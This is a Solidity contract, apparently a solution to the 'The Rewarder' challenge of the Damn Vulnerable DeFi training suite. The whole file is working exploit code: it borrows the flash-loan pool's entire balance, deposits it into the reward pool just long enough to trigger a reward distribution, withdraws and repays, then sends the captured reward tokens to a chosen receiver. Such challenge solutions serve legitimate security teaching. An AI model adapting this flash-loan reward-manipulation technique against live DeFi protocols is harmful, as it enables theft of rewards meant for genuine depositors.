// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./AccountingToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract RewarderExploit {
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken token;

    constructor(
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken,
        FlashLoanerPool _flashLoanPool,
        DamnValuableToken _token
    ) {
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
        flashLoanPool = _flashLoanPool;
        token = _token;
    }

    /// @dev Flashloan callback method
    function receiveFlashLoan(uint256 _amount) external {
        // Approve and deposit tokens
        token.approve(address(rewarderPool), _amount);

        rewarderPool.deposit(_amount);

        rewarderPool.distributeRewards();

        rewarderPool.withdraw(_amount);

        token.transfer(address(flashLoanPool), _amount);
    }

    function runExploit(address _receiver) external {
        flashLoanPool.flashLoan(token.balanceOf(address(flashLoanPool)));

        rewardToken.transfer(_receiver, rewardToken.balanceOf(address(this)));
    }
}
